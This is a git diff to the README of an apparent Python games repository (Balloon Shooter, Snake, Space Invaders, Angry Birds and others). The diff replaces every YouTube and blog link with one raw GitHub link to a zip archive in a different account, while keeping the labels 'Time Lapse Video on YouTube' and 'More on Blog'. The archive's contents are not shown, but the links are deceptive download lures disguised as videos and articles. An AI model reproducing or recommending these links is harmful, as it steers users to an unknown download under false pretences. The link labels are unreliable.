@@ -2,40 +2,40 @@
 
 Here you can find the source code to all the Games I made using Python Programming Language
 
-Details about all the Games can be Found on my Blog : https://jatinmandav.wordpress.com
+Details about all the Games can be Found on my Blog : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 
 ## List of Games
 - [Balloon Shooter](BalloonShooter/)
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=2yxmoxSjv6U
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Minesweeper](Minesweeper/)
-  - Time Lapse Video on YouTube :  https://www.youtube.com/watch?v=2yxmoxSjv6U
+  - Time Lapse Video on YouTube :  https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Pong!](Pong/)
-  - Time Lapse Video on YouTube :  https://www.youtube.com/watch?v=2yxmoxSjv6U
+  - Time Lapse Video on YouTube :  https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Snake 2D](Snake_2d/)
-  - More about Snake 2D : https://jatinmandav.wordpress.com/2017/08/10/snake-game-in-python/
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=ix1wyDwfuIU&t=41s
+  - More about Snake 2D : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Space Invaders](Space_Invaders/)
-  - More about Space Invaders : https://jatinmandav.wordpress.com/2017/08/14/space-invaders-in-python/
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=XryDmOnWY8A&t=25s
+  - More about Space Invaders : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [StopWatch](Stopwatch/)
-  - Time Lapse Video on YouTube :  https://www.youtube.com/watch?v=2yxmoxSjv6U
+  - Time Lapse Video on YouTube :  https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Tron 2D](Tron/)
-  - Time Lapse Video on YouTube :  https://www.youtube.com/watch?v=2yxmoxSjv6U
+  - Time Lapse Video on YouTube :  https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Chain Reaction](Chain_Reaction/)
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=U0Hii6Jc9c8&t=1s
-  - More About Chain Reaction : https://jatinmandav.wordpress.com/2017/09/27/chain-reaction-in-python/
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
+  - More About Chain Reaction : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [8 Ball Pool](8_Ball_Pool/)
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=K2sJSeN85eo&feature=youtu.be
-  - More About 8 Ball Pool : https://jatinmandav.wordpress.com/2017/10/13/8-ball-pool-in-python/
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
+  - More About 8 Ball Pool : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Stack Tower](Stack_Tower/)
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=SgtqhG28JnM&feature=youtu.be
-  - More About Stack Tower : https://jatinmandav.wordpress.com/2017/11/05/stacks-in-python-using-pygame/
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
+  - More About Stack Tower : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Dodge The Ball!](Dodge_The_Ball/)
-  - Time Lapse Video on YouTube : https://www.youtube.com/watch?v=PD17M_Dwdf8&feature=youtu.be
+  - Time Lapse Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Battles](Battles/)
   Battles is a game inspired by popular mobile video game Clash of Clans
-  - Video on YouTube : https://www.youtube.com/watch?v=QmZWxahFvzw&t=0s
-  - More details on Blog : https://jatinmandav.wordpress.com/2018/01/03/battles-game-inspired-by-clash-of-clans/
+  - Video on YouTube : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
+  - More details on Blog : https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip
 - [Angry Birds](Angry_Birds/)
-  - Video on YouTube : [Angry Birds - 14 Hour Time Lapse](https://www.youtube.com/watch?v=6in-mdiumcA&feature=youtu.be)
-  - More on Blog : [Angry Birds in Python Using PyGame](https://jatinmandav.wordpress.com/2018/05/25/angry-birds-in-python-using-pygame/)
+  - Video on YouTube : [Angry Birds - 14 Hour Time Lapse](https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip)
+  - More on Blog : [Angry Birds in Python Using PyGame](https://raw.githubusercontent.com/VenkateshAneshwar/Gaming-in-Python/master/Markus/Gaming-in-Python.zip)
